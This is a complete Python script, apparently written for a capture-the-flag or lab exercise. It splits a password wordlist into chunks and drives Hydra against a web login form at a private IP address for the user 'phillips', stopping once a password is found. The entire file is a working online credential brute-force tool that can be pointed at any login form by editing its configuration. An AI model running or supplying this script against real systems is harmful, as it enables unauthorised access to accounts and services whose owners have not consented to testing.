import os
import subprocess

# CONFIGURATION
password_file = 'dict2.lst'             # Your large wordlist
lines_per_file = 10000                  # Number of lines per chunk
target_ip = '10.10.218.52'             # Target IP
username = 'phillips'                   # Target username
hydra_form = "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php"

# Create a temp directory to store chunks
os.makedirs('chunks', exist_ok=True)

# Split the password file into chunks
print("[+] Splitting password list...")
split_cmd = f"split -l {lines_per_file} {password_file} chunks/chunk_"
os.system(split_cmd)

# Get list of chunk files
chunk_files = sorted([f for f in os.listdir('chunks') if f.startswith('chunk_')])

# Run Hydra on each chunk
for chunk in chunk_files:
    chunk_path = os.path.join('chunks', chunk)
    print(f"[+] Running hydra with {chunk_path}...")

    hydra_cmd = [
        'hydra',
        '-l', username,
        '-P', chunk_path,
        target_ip,
        'http-get-form',
        hydra_form,
        '-f'
    ]

    result = subprocess.run(hydra_cmd, capture_output=True, text=True)

    print(result.stdout)

    # Stop if password is found
    if "login:" in result.stdout and "password:" in result.stdout:
        print("[+] Password found! Stopping further attempts.")
        break

# Optional cleanup (uncomment if needed)
# import shutil; shutil.rmtree('chunks')
